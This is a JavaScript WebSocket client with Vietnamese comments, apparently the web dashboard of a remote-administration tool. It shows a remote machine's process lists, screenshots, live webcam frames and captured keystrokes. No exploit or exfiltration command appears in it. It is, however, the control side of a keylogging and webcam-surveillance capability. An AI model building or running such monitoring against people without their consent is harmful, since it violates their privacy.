/**
 * websocket.js - WebSocket Connection & Message Handling
 * Handles connection to Gateway and processes incoming messages
 */

// --- WEBSOCKET CONNECTION ---
// Hàm này sẽ được gọi từ file HTML sau khi đã có GATEWAY_URL
function initWebSocket(gatewayUrl) {
    console.log("Đang kết nối tới:", gatewayUrl);
    logStatus("Đang kết nối tới Gateway...");
    
    ws = new WebSocket(gatewayUrl);

    ws.onopen = function() {
        logStatus("Đã kết nối thành công!");
        console.log("WebSocket Connected");
        
        // Đăng ký danh tính với Gateway: Tôi là Web Client
        // Gateway sẽ dùng role này để định tuyến tin nhắn
        ws.send(JSON.stringify({
            type: "register",
            role: "web"
        }));
    };

    ws.onmessage = function(event) {
        try {
            const msg = JSON.parse(event.data);
            handleServerMessage(msg);
        } catch (e) {
            console.error("Lỗi đọc dữ liệu JSON:", e);
            logStatus("Lỗi: Nhận dữ liệu không hợp lệ.");
        }
    };

    ws.onclose = function() {
        logStatus("Mất kết nối! Vui lòng tải lại trang.");
        alert("Đã mất kết nối tới Server Gateway.");
    };

    ws.onerror = function(error) {
        console.error("WebSocket Error:", error);
        logStatus("Lỗi kết nối Socket.");
    };
}

// --- MESSAGE HANDLING ---
function handleServerMessage(msg) {
    // msg can be:
    // - Legacy format: { type: "...", data: "..." }
    // - API contract format: { success: true/false, message: "...", data: "...", type: "..." }
    
    // Check if this is an API contract response (has 'success' field)
    if (msg.hasOwnProperty('success')) {
        // Handle API contract format responses
        if (!msg.success) {
            logStatus("Lỗi: " + (msg.message || "Command failed"));
            // If keylogger command failed, revert state
            if (msg.message && (msg.message.includes("Keylog") || msg.message.includes("keylog"))) {
                isKeyloggerActive = false;
                updateKeylogButtons();
                if (keylogAutoRefreshTimer) {
                    clearInterval(keylogAutoRefreshTimer);
                    keylogAutoRefreshTimer = null;
                }
            }
            // If webcam command failed, revert state
            if (msg.message && (msg.message.includes("Webcam") || msg.message.includes("webcam"))) {
                // If START command failed, we were waiting for frame - cancel that
                isWebcamOn = false;
                isWaitingForWebcamFrame = false;
                updateWebcamButton();
            }
            return;
        }
        
        // Success - handle specific API contract responses
        
        // PROCESS_LIST response
        if (msg.hasOwnProperty('processes') && Array.isArray(msg.processes)) {
            currentListView = 'LIST_PROCESS';
            // Convert API contract format to internal format
            const normalizedData = msg.processes.map(proc => ({
                pid: proc.processId,
                name: proc.name
            }));
            renderTable(normalizedData);
            switchView('view-table', 'Danh sách Tiến trình');
            logStatus(`✓ Nhận ${msg.count || msg.processes.length} tiến trình`);
            return;
        }
        
        // APPLICATION_LIST response
        if (msg.hasOwnProperty('applications') && Array.isArray(msg.applications)) {
            currentListView = 'LIST_APPS';
            // Convert API contract format to internal format
            const normalizedData = msg.applications.map(app => ({
                pid: app.processId,
                name: app.name
            }));
            renderTable(normalizedData);
            switchView('view-table', 'Danh sách Ứng dụng');
            logStatus(`✓ Nhận ${msg.count || msg.applications.length} ứng dụng`);
            return;
        }
        
        // TAKEPIC response
        if (msg.hasOwnProperty('imageData')) {
            const img = document.getElementById('monitor-img');
            if (img) {
                img.src = "data:image/" + (msg.format || "jpeg") + ";base64," + msg.imageData;
            }
            logStatus("✓ Đã nhận ảnh chụp màn hình");
            return;
        }
        
        // KEYLOG_PRINT response (has 'data' field)
        if (msg.hasOwnProperty('data') && !msg.hasOwnProperty('frameData')) {
            handleKeylogPrint(msg);
            return;
        }
        
        // WEBCAM_FRAME in API contract format (has 'frameData' field)
        if (msg.hasOwnProperty('frameData')) {
            const webcamImg = document.getElementById('monitor-img');
            if (webcamImg && msg.frameData) {
                const format = msg.format || "jpeg";
                webcamImg.src = "data:image/" + format + ";base64," + msg.frameData;
                
                // If we're waiting for the first frame, update UI state now
                if (isWaitingForWebcamFrame) {
                    isWebcamOn = true;
                    isWaitingForWebcamFrame = false;
                    updateWebcamButton();
                    logStatus("✓ Webcam đã bật và đang hoạt động!");
                }
            }
            return;
        }
        
        // WEBCAM_START response - don't update UI here, wait for first frame
        if (msg.message && (msg.message.includes("Webcam streaming started") || msg.message.includes("Webcam streaming"))) {
            // Don't update UI state yet - wait for first frame to confirm it's working
            logStatus("✓ " + msg.message + " - Đợi frame đầu tiên...");
            return;
        }
        
        // WEBCAM_STOP response - UI already updated on button press, just confirm
        if (msg.message && (msg.message.includes("Webcam streaming stopped") || msg.message.includes("Webcam stopped"))) {
            // UI already updated optimistically, just log confirmation
            logStatus("✓ " + msg.message);
            return;
        }
        
        // Generic success message for other commands
        if (msg.message) {
            logStatus("✓ " + msg.message);
        }
        return;
    }
    
    // Handle legacy message formats
    switch (msg.type) {
        case 'LIST_APPS':
        case 'LIST_PROCESS':
            // Xử lý dữ liệu danh sách processes/apps
            // msg.data mong đợi là mảng: [{pid: 123, name: "notepad.exe"}, ...]
            currentListView = msg.type; // Track which list view we're showing
            renderTable(msg.data); 
            // Tự động chuyển view sang bảng
            switchView('view-table', msg.type === 'LIST_APPS' ? 'Danh sách Ứng dụng' : 'Danh sách Tiến trình');
            break;

        case 'IMAGE_DATA':
            // Xử lý ảnh (Screenshot hoặc Webcam)
            // msg.data là chuỗi Base64
            const img = document.getElementById('monitor-img');
            if (img) {
                img.src = "data:image/jpeg;base64," + msg.data;
            }
            break;

        case 'WEBCAM_FRAME':
            // Handle webcam frame from API contract
            const webcamImg = document.getElementById('monitor-img');
            if (webcamImg && msg.frameData) {
                const format = msg.format || "jpeg";
                webcamImg.src = "data:image/" + format + ";base64," + msg.frameData;
                
                // If we're waiting for the first frame, update UI state now
                if (isWaitingForWebcamFrame) {
                    isWebcamOn = true;
                    isWaitingForWebcamFrame = false;
                    updateWebcamButton();
                    logStatus("✓ Webcam đã bật và đang hoạt động!");
                }
            }
            break;
        
        case 'RESPONSE':
            // Tin nhắn phản hồi chung (ví dụ: "Command executed")
            logStatus("Server: " + msg.data);
            break;
            
        case 'ERROR':
            logStatus("Lỗi từ Server: " + msg.data);
            break;
            
        default:
            console.log("Tin nhắn không xác định:", msg);
    }
}

// Handle KEYLOG_PRINT response (identified by presence of 'data' field)
function handleKeylogPrint(msg) {
    if (!msg.success) {
        logStatus("Lỗi: " + (msg.message || "Failed to retrieve keylog"));
        return;
    }
    
    // Received keystroke data
    const textArea = document.getElementById('keylog-area');
    if (textArea) {
        if (msg.data) {
            textArea.value += msg.data;
            // Auto-scroll to bottom
            textArea.scrollTop = textArea.scrollHeight;
        }
        // Don't update status for auto-refresh to avoid spam
        if (!keylogAutoRefreshTimer) {
            logStatus("Đã nhận " + (msg.data ? msg.data.length : 0) + " ký tự");
        }
    }
}

// --- UTILITY ---
// Hàm gửi dữ liệu chung qua WebSocket
function sendToGateway(payload) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(payload));
        console.log("Đã gửi:", payload);
    } else {
        alert("Chưa kết nối tới Gateway! Vui lòng kiểm tra lại.");
    }
}

